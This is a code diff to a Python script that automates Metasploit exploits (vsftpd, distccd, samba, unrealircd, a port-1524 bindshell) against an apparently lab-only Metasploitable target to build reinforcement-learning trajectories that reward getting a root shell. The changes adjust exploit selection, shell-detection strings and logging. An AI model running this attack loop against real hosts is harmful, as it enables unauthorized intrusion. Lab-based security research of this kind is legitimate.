@@ -31,6 +31,7 @@ MSF_MODULES = {
             "Command shell session",
             "session .* opened",
             "uid=0",
+            "uid=0(root)",
             "root",
         ],
     },
@@ -43,6 +44,7 @@ MSF_MODULES = {
             "Command shell session",
             "session .* opened",
             "uid=",
+            "uid=0",
         ],
     },
     "exploit_distccd": {
@@ -54,6 +56,7 @@ MSF_MODULES = {
             "Command shell session",
             "session .* opened",
             "uid=",
+            "uid=0",
         ],
     },
     "exploit_samba": {
@@ -65,6 +68,7 @@ MSF_MODULES = {
             "Command shell session",
             "session .* opened",
             "uid=",
+            "uid=0",
         ],
     },
 }
@@ -89,8 +93,8 @@ def validate_private_target(target: str):
 
 def auto_detect_lhost(target: str) -> str:
     """
-    Tries to infer the Kali/local IP used to reach the target.
-    No packet is sent for UDP connect.
+    Infer the Kali/local IP used to reach the target.
+    UDP connect does not send packets.
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -139,6 +143,7 @@ def run_command(cmd, timeout=120, input_text=None):
             "stdout": result.stdout or "",
             "stderr": result.stderr or "",
         }
+
     except subprocess.TimeoutExpired as e:
         return {
             "cmd": cmd,
@@ -146,6 +151,7 @@ def run_command(cmd, timeout=120, input_text=None):
             "stdout": e.stdout or "",
             "stderr": f"TimeoutExpired after {timeout}s",
         }
+
     except FileNotFoundError as e:
         return {
             "cmd": cmd,
@@ -168,13 +174,16 @@ def run_nmap(target: str, service_scan: bool):
 
 def parse_open_ports(nmap_output: str):
     ports = []
+
     for line in nmap_output.splitlines():
         line = line.strip()
+
         if "/tcp" in line and " open " in line:
             try:
                 ports.append(int(line.split("/")[0]))
             except ValueError:
                 pass
+
     return sorted(set(ports))
 
 
@@ -258,8 +267,10 @@ def try_bindshell(target: str):
     )
 
     output = (result["stdout"] + "\n" + result["stderr"]).lower()
+
     success = (
         "uid=0" in output
+        or "uid=0(root)" in output
         or "root" in output
         or ("linux" in output and result["returncode"] == 0)
     )
@@ -280,7 +291,6 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
         f"set RHOST {target}",
         f"set RPORT {config['rport']}",
         "set VERBOSE false",
-        "set ExitOnSession false",
     ]
 
     if config["payload"]:
@@ -321,6 +331,10 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
             success = True
             break
 
+    # Avoid false positive when Metasploit explicitly says no session was created.
+    if "no session was created" in combined_lower:
+        success = False
+
     return {
         "success": success,
         "tool": "metasploit",
@@ -333,7 +347,7 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
     }
 
 
-def choose_available_exploit(state: dict):
+def available_exploits(state: dict):
     candidates = []
 
     if state["has_bindshell_1524"]:
@@ -351,10 +365,50 @@ def choose_available_exploit(state: dict):
     if state["has_samba"]:
         candidates.append("exploit_samba")
 
-    if not candidates:
-        return random.choice(EXPLOITS)
+    return candidates
 
-    return random.choice(candidates)
+
+def choose_stable_exploit(state: dict):
+    """
+    Stable choice for good/recovery trajectories.
+    Prefer reliable shell verification first, then other modules.
+    """
+    if state["has_bindshell_1524"]:
+        return "exploit_bindshell"
+
+    if state["has_samba"]:
+        return "exploit_samba"
+
+    if state["has_unrealircd"]:
+        return "exploit_unrealircd"
+
+    if state["has_distccd"]:
+        return "exploit_distccd"
+
+    if state["has_vsftpd_234"] or state["has_ftp"]:
+        return "exploit_vsftpd"
+
+    return random.choice(EXPLOITS)
+
+
+def choose_random_available_exploit(state: dict):
+    """
+    Random choice for noisy trajectories.
+    This keeps the dataset diverse.
+    """
+    candidates = available_exploits(state)
+
+    if candidates:
+        return random.choice(candidates)
+
+    return random.choice(EXPLOITS)
+
+
+def choose_available_exploit(state: dict, mode: str = "stable"):
+    if mode == "random":
+        return choose_random_available_exploit(state)
+
+    return choose_stable_exploit(state)
 
 
 def gen_good():
@@ -380,7 +434,7 @@ def gen_noisy():
     return [
         random.choice(["scan_basic", "scan_service"]),
         random.choice(["scan_basic", "scan_service"]),
-        random.choice(EXPLOITS),
+        "random_exploit",
         "auto_exploit",
         "stop",
     ]
@@ -399,11 +453,15 @@ def gen_fail():
         ["scan_basic", "exploit_distccd", "stop"],
         ["scan_basic", "exploit_samba", "stop"],
         ["scan_service", "scan_basic", "stop"],
+        ["scan_service", "random_exploit", "stop"],
     ]
     return random.choice(fail_paths)
 
 
 def build_plan(n_runs: int):
+    """
+    Build a shuffled plan so even small test runs include mixed policy types.
+    """
     policies = (
         ["good"] * 90
         + ["recover"] * 90
@@ -413,11 +471,11 @@ def build_plan(n_runs: int):
 
     plan = []
     while len(plan) < n_runs:
-        plan.extend(policies)
+        block = policies[:]
+        random.shuffle(block)
+        plan.extend(block)
 
-    plan = plan[:n_runs]
-    random.shuffle(plan)
-    return plan
+    return plan[:n_runs]
 
 
 def apply_action(action, state, target, lhost, raw_dir, run_id, step):
@@ -426,7 +484,10 @@ def apply_action(action, state, target, lhost, raw_dir, run_id, step):
     before_state = deepcopy(state)
 
     if action == "auto_exploit":
-        resolved_action = choose_available_exploit(state)
+        resolved_action = choose_available_exploit(state, mode="stable")
+
+    elif action == "random_exploit":
+        resolved_action = choose_available_exploit(state, mode="random")
 
     if resolved_action == "scan_basic":
         result = run_nmap(target, service_scan=False)
@@ -521,6 +582,7 @@ def apply_action(action, state, target, lhost, raw_dir, run_id, step):
 
     elif resolved_action == "stop":
         done = True
+
         if state["has_shell"]:
             reward = 6.0
             info = {
@@ -604,8 +666,8 @@ def main():
     parser.add_argument("--target", required=True, help="Target IP, e.g. Metasploitable IP")
     parser.add_argument("--lhost", default=None, help="Kali/local IP for reverse payloads")
     parser.add_argument("--runs", type=int, default=20)
-    parser.add_argument("--out_dir", default="real_logs/msf_rl_env_runs")
-    parser.add_argument("--raw_dir", default="real_logs/msf_raw")
+    parser.add_argument("--out_dir", default="dataset/real_logs/msf_rl_env_runs")
+    parser.add_argument("--raw_dir", default="dataset/real_logs/msf_raw")
     parser.add_argument("--seed", type=int, default=42)
     parser.add_argument("--authorized_lab", action="store_true")
     args = parser.parse_args()
@@ -630,6 +692,8 @@ def main():
     print(f"[*] Target: {args.target}")
     print(f"[*] LHOST:  {lhost}")
     print(f"[*] Runs:   {args.runs}")
+    print(f"[*] Out:    {out_dir}")
+    print(f"[*] Raw:    {raw_dir}")
 
     plan = build_plan(args.runs)
 
